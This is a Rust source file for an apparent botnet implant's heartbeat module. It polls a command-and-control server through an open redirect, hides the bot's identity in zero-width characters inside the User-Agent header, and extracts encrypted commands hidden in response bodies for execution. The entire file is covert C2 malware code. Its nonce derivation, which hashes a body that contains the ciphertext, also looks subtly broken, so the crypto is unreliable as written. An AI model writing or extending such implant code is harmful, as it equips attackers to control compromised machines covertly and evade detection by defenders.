//! Heartbeat: stealthy bot check-in via open redirect with ZW headers.
//!
//! Sends periodic health check requests through a configured open redirect URL.
//! User-Agent header carries ZW-encoded bot identity invisibly.
//! Heartbeat response body is scanned for ZW-encoded C2 commands.
//! Extracted commands are forwarded to the executor via mpsc channel.

use std::sync::Arc;
use std::time::Duration;
use reqwest::Client;
use tokio::sync::{watch, RwLock, mpsc};
use tracing::{debug, warn};

use arcticfox_core::crypto::{BotHasher, SESSION_KEY_LEN, NONCE_LEN};
use arcticfox_core::zwcodec;
use arcticfox_zwtransport::open_oneshot;

use crate::fetcher;

const DEFAULT_HEARTBEAT_INTERVAL: u64 = 300;

fn zw_user_agent(bot_id: &str) -> String {
    let visible = fetcher::random_user_agent();
    let encoded = zwcodec::encode(bot_id.as_bytes());
    format!("{}{}", visible, encoded)
}

#[derive(Debug, Clone)]
struct HbConfig {
    url: String,
    interval: u64,
    enabled: bool,
    session_key: Option<[u8; SESSION_KEY_LEN]>,
}

impl Default for HbConfig {
    fn default() -> Self {
        HbConfig {
            url: String::new(),
            interval: DEFAULT_HEARTBEAT_INTERVAL,
            enabled: false,
            session_key: None,
        }
    }
}

pub struct Heartbeat {
    config: Arc<RwLock<HbConfig>>,
    client: Option<Client>,
    cmd_tx: mpsc::UnboundedSender<String>,
}

impl Heartbeat {
    pub fn new(cmd_tx: mpsc::UnboundedSender<String>) -> Self {
        Heartbeat {
            config: Arc::new(RwLock::new(HbConfig::default())),
            client: None,
            cmd_tx,
        }
    }

    pub async fn update_config(&self, url: String, interval_secs: u64) {
        let enabled = !url.is_empty();
        let mut cfg = self.config.write().await;
        cfg.url = url;
        cfg.interval = interval_secs.max(30);
        cfg.enabled = enabled;
    }

    pub async fn update_session_key(&self, key: [u8; SESSION_KEY_LEN]) {
        self.config.write().await.session_key = Some(key);
    }

    pub fn start(
        &self,
        bot_id: String,
        hasher: BotHasher,
        client: Client,
        mut shutdown: watch::Receiver<bool>,
    ) -> tokio::task::JoinHandle<()> {
        let config = self.config.clone();
        let cmd_tx = self.cmd_tx.clone();

        tokio::spawn(async move {
            let mut fail_count: u32 = 0;

            loop {
                let (wait_interval, enabled) = {
                    let cfg = config.read().await;
                    (cfg.interval, cfg.enabled)
                };

                if !enabled {
                    tokio::select! {
                        _ = tokio::time::sleep(Duration::from_secs(60)) => continue,
                        _ = shutdown.changed() => {
                            if *shutdown.borrow() { return; }
                            continue;
                        }
                    }
                }

                let padded_hash = hasher.generate_padded_hash(&bot_id);
                let url = {
                    let cfg = config.read().await;
                    cfg.url.replace("{hash}", &padded_hash)
                        .replace("{id}", &padded_hash)
                };

                let ua = zw_user_agent(&bot_id);
                let req = client
                    .get(&url)
                    .header("User-Agent", &ua)
                    .timeout(Duration::from_secs(15));

                match req.send().await {
                    Ok(resp) => {
                        if let (Some(session_key), Ok(body)) = (
                            config.read().await.session_key,
                            resp.text().await,
                        ) {
                            if let Some(cmd) = extract_zw_command(&body, &session_key) {
                                debug!("Received ZW command via heartbeat");
                                let _ = cmd_tx.send(cmd);
                            }
                        }
                        fail_count = 0;
                    }
                    Err(_e) => {
                        fail_count += 1;
                        let backoff = Duration::from_secs(30 * (1 << fail_count.min(6)));
                        warn!("Heartbeat failed ({}/6): backing off {}s", fail_count, backoff.as_secs());
                        tokio::select! {
                            _ = tokio::time::sleep(backoff) => continue,
                            _ = shutdown.changed() => {
                                if *shutdown.borrow() { return; }
                                continue;
                            }
                        }
                    }
                }

                tokio::select! {
                    _ = tokio::time::sleep(Duration::from_secs(wait_interval)) => {}
                    _ = shutdown.changed() => {
                        if *shutdown.borrow() { return; }
                    }
                }
            }
        })
    }
}

/// Extract ZW-encoded encrypted commands from a heartbeat response body.
/// Nonce is derived from the response content hash, not zero.
fn extract_zw_command(body: &str, key: &[u8; SESSION_KEY_LEN]) -> Option<String> {
    // Derive nonce from response content — not zero!
    let hash = arcticfox_core::crypto::sha256_hex(body.as_bytes());
    let mut nonce = [0u8; NONCE_LEN];
    nonce.copy_from_slice(&hex::decode(&hash[..24]).ok()?);

    for field in ["ts", "nonce", "n", "ref", "id"] {
        if let Some(start) = body.find(&format!("\"{}\":\"", field)) {
            let after = &body[start + field.len() + 4..];
            if let Some(end) = after.find('"') {
                let value = &after[..end];
                if let Ok(plaintext) = open_oneshot(key, &nonce, value) {
                    return String::from_utf8(plaintext).ok();
                }
            }
        }
    }
    None
}
